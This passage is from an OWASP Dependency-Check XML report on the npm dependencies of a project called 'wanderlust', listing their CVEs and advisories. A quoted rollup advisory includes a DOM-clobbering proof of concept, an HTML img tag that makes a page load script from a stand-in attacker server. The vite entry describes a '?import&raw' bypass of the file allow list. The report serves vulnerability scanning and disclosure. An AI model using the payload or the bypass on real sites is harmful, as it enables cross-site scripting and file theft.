</source><url>https://nvd.nist.gov/vuln/detail/CVE-2025-7783</url><name>https://nvd.nist.gov/vuln/detail/CVE-2025-7783</name></reference></references><vulnerableSoftware><software>cpe:2.3:a:*:form-data:\&gt;\=4.0.0\&lt;4.0.4:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="OSSINDEX"><name>CVE-2025-7783</name><severity>HIGH</severity><cvssV2><score>9.399999618530273</score><accessVector>NETWORK</accessVector><accessComplexity>HIGH</accessComplexity><authenticationr></authenticationr><confidentialityImpact></confidentialityImpact><integrityImpact></integrityImpact><availabilityImpact></availabilityImpact><severity>HIGH</severity><version>2.0</version></cvssV2><cwes><cwe>CWE-330</cwe></cwes><description>Use of Insufficiently Random Values vulnerability in form-data allows HTTP Parameter Pollution (HPP). This vulnerability is associated with program files lib/form_data.Js.

This issue affects form-data: &lt; 2.5.4, 3.0.0 - 3.0.3, 4.0.0 - 4.0.3.

Sonatype&apos;s research suggests that this CVE&apos;s details differ from those defined at NVD. See https://ossindex.sonatype.org/vulnerability/CVE-2025-7783 for details</description><references><reference><source>OSSINDEX</source><url>https://ossindex.sonatype.org/vulnerability/CVE-2025-7783?component-type=npm&amp;component-name=form-data&amp;utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=12.1.3</url><name>[CVE-2025-7783] CWE-330: Use of Insufficiently Random Values</name></reference><reference><source>OSSIndex</source><url>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2025-7783</url><name>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2025-7783</name></reference><reference><source>OSSIndex</source><url>https://github.com/advisories/GHSA-fjxv-7rqg-78g4</url><name>https://github.com/advisories/GHSA-fjxv-7rqg-78g4</name></reference></references><vulnerableSoftware><software vulnerabilityIdMatched="true">cpe:2.3:a:*:form-data:4.0.0:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability></vulnerabilities></dependency><dependency isVirtual="false"><fileName>helper-objects.js</fileName><filePath>/var/lib/jenkins/workspace/wanderlust-CI/backend/tests/utils/helper-objects.js</filePath><md5>2ce221fa876740b2468d9ca0b0843d36</md5><sha1>aef579bf7a6de1fa2d38796485e3d87da3f7512c</sha1><sha256>7c1ad29a0ed4ab8e2299595aa435e49739ebb4a5ad9eaef83c7f6c3f7a04bfdc</sha256><evidenceCollected></evidenceCollected></dependency><dependency isVirtual="false"><fileName>index.js</fileName><filePath>/var/lib/jenkins/workspace/wanderlust-CI/backend/api/index.js</filePath><md5>33110c36687d8da5fc4629bcbe1b0d79</md5><sha1>2b443b0a1404a283ba8dbc32552ba4e9a168365e</sha1><sha256>8bc2d47541a4b8ddc87390783d23040e3bb05796c31ab17eddbf72a26ead5998</sha256><evidenceCollected></evidenceCollected></dependency><dependency isVirtual="true"><fileName>micromatch:4.0.5</fileName><filePath>/var/lib/jenkins/workspace/wanderlust-CI/frontend/package-lock.json?micromatch</filePath><md5></md5><sha1></sha1><sha256></sha256><projectReferences><projectReference>package-lock.json: transitive</projectReference></projectReferences><evidenceCollected><evidence type="vendor" confidence="HIGH"><source>package.json</source><name>name</name><value>micromatch</value></evidence><evidence type="product" confidence="HIGHEST"><source>package.json</source><name>name</name><value>micromatch</value></evidence><evidence type="version" confidence="HIGHEST"><source>package.json</source><name>version</name><value>4.0.5</value></evidence></evidenceCollected><identifiers><package confidence="HIGHEST"><id>pkg:npm/micromatch@4.0.5</id><url>https://ossindex.sonatype.org/component/pkg:npm/micromatch@4.0.5?utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=12.1.3</url></package></identifiers><vulnerabilities><vulnerability source="OSSINDEX"><name>CVE-2024-4067</name><severity>HIGH</severity><cvssV3><baseScore>7.5</baseScore><attackVector>NETWORK</attackVector><attackComplexity>LOW</attackComplexity><privilegesRequired>NONE</privilegesRequired><userInteraction>NONE</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>NONE</confidentialityImpact><integrityImpact>NONE</integrityImpact><availabilityImpact>HIGH</availabilityImpact><baseSeverity>HIGH</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-1333</cwe></cwes><description>The NPM package `micromatch` prior to 4.0.8 is vulnerable to Regular Expression Denial of Service (ReDoS). The vulnerability occurs in `micromatch.braces()` in `index.js` because the pattern `.*` will greedily match anything. By passing a malicious payload, the pattern matching will keep backtracking to the input while it doesn&apos;t find the closing bracket. As the input size increases, the consumption time will also increase until it causes the application to hang or slow down. There was a merged fix but further testing shows the issue persists. This issue should be mitigated by using a safe pattern that won&apos;t start backtracking the regular expression due to greedy matching. This issue was fixed in version 4.0.8.</description><references><reference><source>OSSIndex</source><url>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-4067</url><name>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-4067</name></reference><reference><source>OSSINDEX</source><url>https://ossindex.sonatype.org/vulnerability/CVE-2024-4067?component-type=npm&amp;component-name=micromatch&amp;utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=12.1.3</url><name>[CVE-2024-4067] CWE-1333</name></reference><reference><source>OSSIndex</source><url>https://security-tracker.debian.org/tracker/CVE-2024-4067</url><name>https://security-tracker.debian.org/tracker/CVE-2024-4067</name></reference></references><vulnerableSoftware><software vulnerabilityIdMatched="true">cpe:2.3:a:*:micromatch:4.0.5:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="NPM"><name>GHSA-952p-6rrq-rcjv</name><severity unscored="true">moderate</severity><cvssV3><baseScore>5.300000190734863</baseScore><attackVector>NETWORK</attackVector><attackComplexity>LOW</attackComplexity><privilegesRequired>NONE</privilegesRequired><userInteraction>NONE</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>NONE</confidentialityImpact><integrityImpact>NONE</integrityImpact><availabilityImpact>LOW</availabilityImpact><baseSeverity>MEDIUM</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-1333</cwe></cwes><description>The NPM package `micromatch` prior to version 4.0.8 is vulnerable to Regular Expression Denial of Service (ReDoS). The vulnerability occurs in `micromatch.braces()` in `index.js` because the pattern `.*` will greedily match anything. By passing a malicious payload, the pattern matching will keep backtracking to the input while it doesn&apos;t find the closing bracket. As the input size increases, the consumption time will also increase until it causes the application to hang or slow down. There was a merged fix but further testing shows the issue persisted prior to https://github.com/micromatch/micromatch/pull/266. This issue should be mitigated by using a safe pattern that won&apos;t start backtracking the regular expression due to greedy matching.
</description><references><reference><source>NPM Advisory reference: </source><url>https://github.com/micromatch/micromatch/blob/2c56a8604b68c1099e7bc0f807ce0865a339747a/index.js#L448</url><name>https://github.com/micromatch/micromatch/blob/2c56a8604b68c1099e7bc0f807ce0865a339747a/index.js#L448</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/micromatch/micromatch/pull/247</url><name>https://github.com/micromatch/micromatch/pull/247</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/micromatch/micromatch/commit/500d5d6f42f0e8dfa1cb5464c6cb420b1b6aaaa0</url><name>https://github.com/micromatch/micromatch/commit/500d5d6f42f0e8dfa1cb5464c6cb420b1b6aaaa0</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/micromatch/micromatch/pull/266</url><name>https://github.com/micromatch/micromatch/pull/266</name></reference><reference><source>NPM Advisory reference: </source><url>https://devhub.checkmarx.com/cve-details/CVE-2024-4067</url><name>https://devhub.checkmarx.com/cve-details/CVE-2024-4067</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/micromatch/micromatch/releases/tag/4.0.8</url><name>https://github.com/micromatch/micromatch/releases/tag/4.0.8</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/micromatch/micromatch/issues/243</url><name>https://github.com/micromatch/micromatch/issues/243</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/micromatch/micromatch/commit/03aa8052171e878897eee5d7bb2ae0ae83ec2ade</url><name>https://github.com/micromatch/micromatch/commit/03aa8052171e878897eee5d7bb2ae0ae83ec2ade</name></reference><reference><source>NPM Advisory reference: </source><url>https://nvd.nist.gov/vuln/detail/CVE-2024-4067</url><name>https://nvd.nist.gov/vuln/detail/CVE-2024-4067</name></reference><reference><source>NPM Advisory reference: </source><url>https://advisory.checkmarx.net/advisory/CVE-2024-4067</url><name>https://advisory.checkmarx.net/advisory/CVE-2024-4067</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/advisories/GHSA-952p-6rrq-rcjv</url><name>https://github.com/advisories/GHSA-952p-6rrq-rcjv</name></reference></references><vulnerableSoftware><software>cpe:2.3:a:*:micromatch:\&lt;4.0.8:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability></vulnerabilities></dependency><dependency isVirtual="false"><fileName>middleware.js</fileName><filePath>/var/lib/jenkins/workspace/wanderlust-CI/backend/utils/middleware.js</filePath><md5>d5e7467fa759d5e61dd19e337aec4379</md5><sha1>7e4315d2de37b251c6f4553fd34b5d4957651a06</sha1><sha256>24e81223b6a963ccb3c23f25b91a452763a3a27b23c61e8b596048894e2a0ae3</sha256><evidenceCollected></evidenceCollected></dependency><dependency isVirtual="true"><fileName>nanoid:3.3.6</fileName><filePath>/var/lib/jenkins/workspace/wanderlust-CI/frontend/package-lock.json?nanoid</filePath><md5></md5><sha1></sha1><sha256></sha256><projectReferences><projectReference>package-lock.json: transitive</projectReference></projectReferences><evidenceCollected><evidence type="vendor" confidence="HIGH"><source>package.json</source><name>name</name><value>nanoid</value></evidence><evidence type="product" confidence="HIGHEST"><source>package.json</source><name>name</name><value>nanoid</value></evidence><evidence type="version" confidence="HIGHEST"><source>package.json</source><name>version</name><value>3.3.6</value></evidence></evidenceCollected><identifiers><package confidence="HIGHEST"><id>pkg:npm/nanoid@3.3.6</id><url>https://ossindex.sonatype.org/component/pkg:npm/nanoid@3.3.6?utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=12.1.3</url></package></identifiers><vulnerabilities><vulnerability source="OSSINDEX"><name>CVE-2024-55565</name><severity>MEDIUM</severity><cvssV2><score>6.900000095367432</score><accessVector>NETWORK</accessVector><accessComplexity>LOW</accessComplexity><authenticationr></authenticationr><confidentialityImpact></confidentialityImpact><integrityImpact></integrityImpact><availabilityImpact></availabilityImpact><severity>MEDIUM</severity><version>2.0</version></cvssV2><cwes><cwe>CWE-835</cwe></cwes><description>nanoid (aka Nano ID) before 5.0.9 mishandles non-integer values. 3.3.8 is also a fixed version.</description><references><reference><source>OSSIndex</source><url>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-55565</url><name>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-55565</name></reference><reference><source>OSSIndex</source><url>https://github.com/ai/nanoid/pull/510</url><name>https://github.com/ai/nanoid/pull/510</name></reference><reference><source>OSSINDEX</source><url>https://ossindex.sonatype.org/vulnerability/CVE-2024-55565?component-type=npm&amp;component-name=nanoid&amp;utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=12.1.3</url><name>[CVE-2024-55565] CWE-835: Loop with Unreachable Exit Condition (&apos;Infinite Loop&apos;)</name></reference></references><vulnerableSoftware><software vulnerabilityIdMatched="true">cpe:2.3:a:*:nanoid:3.3.6:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="NPM"><name>GHSA-mwcw-c2x4-8c55</name><severity unscored="true">moderate</severity><cvssV3><baseScore>4.300000190734863</baseScore><attackVector>NETWORK</attackVector><attackComplexity>LOW</attackComplexity><privilegesRequired>LOW</privilegesRequired><userInteraction>NONE</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>NONE</confidentialityImpact><integrityImpact>LOW</integrityImpact><availabilityImpact>NONE</availabilityImpact><baseSeverity>MEDIUM</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-835</cwe></cwes><description>When nanoid is called with a fractional value, there were a number of undesirable effects:

1. in browser and non-secure, the code infinite loops on while (size--)
2. in node, the value of poolOffset becomes fractional, causing calls to nanoid to return zeroes until the pool is next filled
3. if the first call in node is a fractional argument, the initial buffer allocation fails with an error

Version 3.3.8 and 5.0.9 are fixed.</description><references><reference><source>NPM Advisory reference: </source><url>https://nvd.nist.gov/vuln/detail/CVE-2024-55565</url><name>https://nvd.nist.gov/vuln/detail/CVE-2024-55565</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/ai/nanoid/compare/3.3.7...3.3.8</url><name>https://github.com/ai/nanoid/compare/3.3.7...3.3.8</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/ai/nanoid/releases/tag/5.0.9</url><name>https://github.com/ai/nanoid/releases/tag/5.0.9</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/advisories/GHSA-mwcw-c2x4-8c55</url><name>https://github.com/advisories/GHSA-mwcw-c2x4-8c55</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/ai/nanoid/pull/510</url><name>https://github.com/ai/nanoid/pull/510</name></reference></references><vulnerableSoftware><software>cpe:2.3:a:*:nanoid:\&lt;3.3.8:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability></vulnerabilities></dependency><dependency isVirtual="false"><fileName>post.js</fileName><filePath>/var/lib/jenkins/workspace/wanderlust-CI/backend/models/post.js</filePath><md5>0983f82db614dee5be6f0f4615be75e6</md5><sha1>5ee6abf90d518b2619e5d7c65c9c4e74dc54a2d6</sha1><sha256>2612ad175440f1c2e671bc24f4520885ddb679cf8a7695e5321f4936a0d7c3e6</sha256><evidenceCollected></evidenceCollected></dependency><dependency isVirtual="false"><fileName>postcss.config.js</fileName><filePath>/var/lib/jenkins/workspace/wanderlust-CI/frontend/postcss.config.js</filePath><md5>c735540bb63936a123bc867d950c9f69</md5><sha1>50423d11f317aef9d5fcfb2563b2a501b344dcd5</sha1><sha256>e32657baf631d7c5f4dc67b4b2ee0ec8e7d5b3c41860e09cddce7c0377cd80bc</sha256><evidenceCollected></evidenceCollected></dependency><dependency isVirtual="false"><fileName>posts-controller.js</fileName><filePath>/var/lib/jenkins/workspace/wanderlust-CI/backend/controllers/posts-controller.js</filePath><md5>0b4d5a7a81d2e71ff1fed54f0813943d</md5><sha1>f847cc158edbedd1c9fb64a992e8de959f9ed893</sha1><sha256>b9e94c735420c4e51865abba14fc6e97fc84ba44804af3e1f3b47556c97b3c58</sha256><evidenceCollected></evidenceCollected></dependency><dependency isVirtual="false"><fileName>posts-controller.test.js</fileName><filePath>/var/lib/jenkins/workspace/wanderlust-CI/backend/tests/integration/controllers/posts-controller.test.js</filePath><md5>c599740ffee841e7a52538b708f3fb93</md5><sha1>10e4c19e24f6cfac136a80eea9284cc1ce7ee89a</sha1><sha256>9de533114d00385a4a1752d35052fcf29090f933f08cc440aca97f691158becd</sha256><evidenceCollected></evidenceCollected></dependency><dependency isVirtual="false"><fileName>posts-controller.test.js</fileName><filePath>/var/lib/jenkins/workspace/wanderlust-CI/backend/tests/unit/controllers/posts-controller.test.js</filePath><md5>9aa04a3348b275e652c4f5ba093f3269</md5><sha1>f76d617f4e8577d0671046ea8eb4ce5666cc71af</sha1><sha256>17757676a2cd0042a3f70634b9eb1a1f14a00d509351a3ea349568c0316f5a8d</sha256><evidenceCollected></evidenceCollected></dependency><dependency isVirtual="false"><fileName>posts.js</fileName><filePath>/var/lib/jenkins/workspace/wanderlust-CI/backend/routes/posts.js</filePath><md5>07fd53647861cbbd9a0a25268b4e722b</md5><sha1>a6f479132f90552e105e4803677f7b36e7f4bd95</sha1><sha256>b03708cbd4cad1ba17728c944fa68edb1971ccb1a5451b931405c1adbf1e8eb3</sha256><evidenceCollected></evidenceCollected></dependency><dependency isVirtual="false"><fileName>redis.js</fileName><filePath>/var/lib/jenkins/workspace/wanderlust-CI/backend/services/redis.js</filePath><md5>dfe9ef539e9eda73ef5abc1378f9ca19</md5><sha1>bda7b3df4dbc7f9665b2fd85088e01648505d38b</sha1><sha256>e5b503051d566d753d85c459f5a0331a5710abcb80d2c7e06b84de4f50f0299b</sha256><evidenceCollected></evidenceCollected></dependency><dependency isVirtual="true"><fileName>rollup:3.29.4</fileName><filePath>/var/lib/jenkins/workspace/wanderlust-CI/frontend/package-lock.json?rollup</filePath><md5></md5><sha1></sha1><sha256></sha256><projectReferences><projectReference>package-lock.json: transitive</projectReference></projectReferences><evidenceCollected><evidence type="vendor" confidence="HIGH"><source>package.json</source><name>name</name><value>rollup</value></evidence><evidence type="product" confidence="HIGHEST"><source>package.json</source><name>name</name><value>rollup</value></evidence><evidence type="version" confidence="HIGHEST"><source>package.json</source><name>version</name><value>3.29.4</value></evidence></evidenceCollected><identifiers><package confidence="HIGHEST"><id>pkg:npm/rollup@3.29.4</id><url>https://ossindex.sonatype.org/component/pkg:npm/rollup@3.29.4?utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=12.1.3</url></package></identifiers><vulnerabilities><vulnerability source="NPM"><name>GHSA-gcx4-mw62-g8wm</name><severity unscored="true">high</severity><cvssV3><baseScore>6.400000095367432</baseScore><attackVector>NETWORK</attackVector><attackComplexity>HIGH</attackComplexity><privilegesRequired>LOW</privilegesRequired><userInteraction>NONE</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>LOW</confidentialityImpact><integrityImpact>LOW</integrityImpact><availabilityImpact>HIGH</availabilityImpact><baseSeverity>MEDIUM</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-79</cwe></cwes><description>### Summary

We discovered a DOM Clobbering vulnerability in rollup when bundling scripts that use `import.meta.url` or with plugins that emit and reference asset files from code  in `cjs`/`umd`/`iife` format. The DOM Clobbering gadget can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an `img` tag with an unsanitized `name` attribute) are present.

It&apos;s worth noting that we’ve identifed similar issues in other popular bundlers like Webpack ([CVE-2024-43788](https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986)), which might serve as a good reference.

### Details

#### Backgrounds

DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:

[1] https://scnps.co/papers/sp23_domclob.pdf
[2] https://research.securitum.com/xss-in-amp4email-dom-clobbering/

#### Gadget found in `rollup`

We have identified a DOM Clobbering vulnerability in `rollup` bundled scripts, particularly when the scripts uses `import.meta` and set output in format of  `cjs`/`umd`/`iife`. In such cases, `rollup` replaces meta property with the URL retrieved from `document.currentScript`.

https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162

https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185

However, this implementation is vulnerable to a DOM Clobbering attack. The `document.currentScript` lookup can be shadowed by an attacker via the browser&apos;s named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the `src` attribute of the attacker-controlled element (e.g., an `img` tag ) is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.

### PoC

Considering a website that contains the following `main.js` script, the devloper decides to use the `rollup` to bundle up the program: `rollup main.js --format cjs --file bundle.js`.

```
var s = document.createElement(&apos;script&apos;)
s.src = import.meta.url + &apos;extra.js&apos;
document.head.append(s)
```

The output `bundle.js` is shown in the following code snippet.

```
&apos;use strict&apos;;

var _documentCurrentScript = typeof document !== &apos;undefined&apos; ? document.currentScript : null;
var s = document.createElement(&apos;script&apos;);
s.src = (typeof document === &apos;undefined&apos; ? require(&apos;u&apos; + &apos;rl&apos;).pathToFileURL(__filename).href : (_documentCurrentScript &amp;&amp; False &amp;&amp; _documentCurrentScript.src || new URL(&apos;bundle.js&apos;, document.baseURI).href)) + &apos;extra.js&apos;;
document.head.append(s);
```

Adding the `rollup` bundled script, `bundle.js`, as part of the web page source code, the page could load the `extra.js` file from the attacker&apos;s domain, `attacker.controlled.server` due to the introduced gadget during bundling. The attacker only needs to insert an `img` tag with the name attribute set to `currentScript`. This can be done through a website&apos;s feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.

```
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;rollup Example&lt;/title&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element starts--!&gt;
  &lt;img name=&quot;currentScript&quot; src=&quot;https://attacker.controlled.server/&quot;&gt;&lt;/img&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element ends--!&gt;
&lt;/head&gt;
&lt;script type=&quot;module&quot; crossorigin src=&quot;bundle.js&quot;&gt;&lt;/script&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt;
```

### Impact

This vulnerability can result in cross-site scripting (XSS) attacks on websites that include rollup-bundled files (configured with an output format of `cjs`, `iife`, or `umd` and use `import.meta`) and allow users to inject certain scriptless HTML tags without properly sanitizing the `name` or `id` attributes.

### Patch

Patching the following two functions with type checking would be effective mitigations against DOM Clobbering attack.

```
const getRelativeUrlFromDocument = (relativePath: string, umd = false) =&gt;
	getResolveUrl(
		`&apos;${escapeId(relativePath)}&apos;, ${
			umd ? `typeof document === &apos;undefined&apos; ? location.href : ` : &apos;&apos;
		}document.currentScript &amp;&amp; document.currentScript.tagName.toUpperCase() === &apos;SCRIPT&apos; &amp;&amp; document.currentScript.src || document.baseURI`
	);
```

```
const getUrlFromDocument = (chunkId: string, umd = false) =&gt;
	`${
		umd ? `typeof document === &apos;undefined&apos; ? location.href : ` : &apos;&apos;
	}(${DOCUMENT_CURRENT_SCRIPT} &amp;&amp; ${DOCUMENT_CURRENT_SCRIPT}.tagName.toUpperCase() === &apos;SCRIPT&apos; &amp;&amp;${DOCUMENT_CURRENT_SCRIPT}.src || new URL(&apos;${escapeId(
		chunkId
	)}&apos;, document.baseURI).href)`;
```
</description><references><reference><source>NPM Advisory reference: </source><url>https://github.com/rollup/rollup/commit/2ef77c00ec2635d42697cff2c0567ccc8db34fb4</url><name>https://github.com/rollup/rollup/commit/2ef77c00ec2635d42697cff2c0567ccc8db34fb4</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/advisories/GHSA-gcx4-mw62-g8wm</url><name>https://github.com/advisories/GHSA-gcx4-mw62-g8wm</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162</url><name>https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185</url><name>https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185</name></reference><reference><source>NPM Advisory reference: </source><url>https://nvd.nist.gov/vuln/detail/CVE-2024-47068</url><name>https://nvd.nist.gov/vuln/detail/CVE-2024-47068</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/rollup/rollup/commit/e2552c9e955e0a61f70f508200ee9f752f85a541</url><name>https://github.com/rollup/rollup/commit/e2552c9e955e0a61f70f508200ee9f752f85a541</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/rollup/rollup/security/advisories/GHSA-gcx4-mw62-g8wm</url><name>https://github.com/rollup/rollup/security/advisories/GHSA-gcx4-mw62-g8wm</name></reference></references><vulnerableSoftware><software>cpe:2.3:a:*:rollup:\&gt;\=3.0.0\&lt;3.29.5:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="OSSINDEX"><name>CVE-2024-47068</name><severity>MEDIUM</severity><cvssV3><baseScore>6.099999904632568</baseScore><attackVector>NETWORK</attackVector><attackComplexity>LOW</attackComplexity><privilegesRequired>NONE</privilegesRequired><userInteraction>REQUIRED</userInteraction><scope>CHANGED</scope><confidentialityImpact>LOW</confidentialityImpact><integrityImpact>LOW</integrityImpact><availabilityImpact>NONE</availabilityImpact><baseSeverity>MEDIUM</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-79</cwe></cwes><description>Rollup is a module bundler for JavaScript. Versions prior to 2.79.2, 3.29.5, and 4.22.4 are susceptible to a DOM Clobbering vulnerability when bundling scripts with properties from `import.meta` (e.g., `import.meta.url`) in `cjs`/`umd`/`iife` format. The DOM Clobbering gadget can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an `img` tag with an unsanitized `name` attribute) are present. Versions 2.79.2, 3.29.5, and 4.22.4  contain a patch for the vulnerability.</description><references><reference><source>OSSIndex</source><url>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-47068</url><name>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-47068</name></reference><reference><source>OSSINDEX</source><url>https://ossindex.sonatype.org/vulnerability/CVE-2024-47068?component-type=npm&amp;component-name=rollup&amp;utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=12.1.3</url><name>[CVE-2024-47068] CWE-79: Improper Neutralization of Input During Web Page Generation (&apos;Cross-site Scripting&apos;)</name></reference><reference><source>OSSIndex</source><url>https://github.com/rollup/rollup/security/advisories/GHSA-gcx4-mw62-g8wm</url><name>https://github.com/rollup/rollup/security/advisories/GHSA-gcx4-mw62-g8wm</name></reference></references><vulnerableSoftware><software vulnerabilityIdMatched="true">cpe:2.3:a:*:rollup:3.29.4:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability></vulnerabilities></dependency><dependency isVirtual="false"><fileName>server.js</fileName><filePath>/var/lib/jenkins/workspace/wanderlust-CI/backend/server.js</filePath><md5>3136c373f49d97e535c562a40137ad91</md5><sha1>978f94d270ce4b630367981c70ac742ee49e0dfa</sha1><sha256>4c876889018814af60351ee0e7f26b9ca0d4e8025eedfb0c85b35594c9570c13</sha256><evidenceCollected></evidenceCollected></dependency><dependency isVirtual="false"><fileName>tailwind.config.js</fileName><filePath>/var/lib/jenkins/workspace/wanderlust-CI/frontend/tailwind.config.js</filePath><md5>d625ed753d8778a5d00bdc6a6f94c02e</md5><sha1>d27755ec854333afd04c48cb6c06900e1e91a2ef</sha1><sha256>7863dcd0edfdb2f63e3240e62e30ffa19156e83e91e315f5d00114ee44eda83d</sha256><evidenceCollected></evidenceCollected></dependency><dependency isVirtual="false"><fileName>teardown.js</fileName><filePath>/var/lib/jenkins/workspace/wanderlust-CI/backend/tests/teardown.js</filePath><md5>35629cb4dcf8de2438e06e5618250a92</md5><sha1>1826931eb31129dfd87b0cce23944f89786583ed</sha1><sha256>a8b95ef9b30baecb0660b02c18e36e43ed8204682bb7b70ad8d764f767e493ac</sha256><evidenceCollected></evidenceCollected></dependency><dependency isVirtual="false"><fileName>user.js</fileName><filePath>/var/lib/jenkins/workspace/wanderlust-CI/backend/models/user.js</filePath><md5>5b21414afe2b1474f63042c8b312a019</md5><sha1>bc8f1e1324bb8ae00d698492de8b28398eba73d5</sha1><sha256>b800ba49fdb2eceeb0bb6db707fc9deae18e0a08350c95ded5a9758af375dad0</sha256><evidenceCollected></evidenceCollected></dependency><dependency isVirtual="false"><fileName>utils.js</fileName><filePath>/var/lib/jenkins/workspace/wanderlust-CI/backend/config/utils.js</filePath><md5>29a2a6fc82c1a40657b04ad2876ee76b</md5><sha1>45b30bda65af9823379bfb3e42ca903f29a984fc</sha1><sha256>581f5ee117d2e29d95094de54a6bfe98cb230d22cb111f2f0afc6dcba61cab92</sha256><evidenceCollected></evidenceCollected></dependency><dependency isVirtual="true"><fileName>vite:4.5.0</fileName><filePath>/var/lib/jenkins/workspace/wanderlust-CI/frontend/package-lock.json?vite</filePath><md5></md5><sha1></sha1><sha256></sha256><projectReferences><projectReference>package-lock.json: transitive</projectReference></projectReferences><evidenceCollected><evidence type="vendor" confidence="HIGH"><source>package.json</source><name>name</name><value>vite</value></evidence><evidence type="product" confidence="HIGHEST"><source>package.json</source><name>name</name><value>vite</value></evidence><evidence type="version" confidence="HIGHEST"><source>package.json</source><name>version</name><value>4.5.0</value></evidence></evidenceCollected><identifiers><package confidence="HIGHEST"><id>pkg:npm/vite@4.5.0</id><url>https://ossindex.sonatype.org/component/pkg:npm/vite@4.5.0?utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=12.1.3</url></package></identifiers><vulnerabilities><vulnerability source="OSSINDEX"><name>CVE-2024-45811</name><severity>HIGH</severity><cvssV2><score>8.699999809265137</score><accessVector>NETWORK</accessVector><accessComplexity>LOW</accessComplexity><authenticationr></authenticationr><confidentialityImpact></confidentialityImpact><integrityImpact></integrityImpact><availabilityImpact></availabilityImpact><severity>HIGH</severity><version>2.0</version></cvssV2><cwes><cwe>CWE-200</cwe></cwes><description>Vite a frontend build tooling framework for javascript. In affected versions the contents of arbitrary files can be returned to the browser. `@fs` denies access to files outside of Vite serving allow list. Adding `?import&amp;raw` to the URL bypasses this limitation and returns the file content if it exists. This issue has been patched in versions 5.4.6, 5.3.6, 5.2.14, 4.5.5, and 3.2.11. Users are advised to upgrade. There are no known workarounds for this vulnerability.

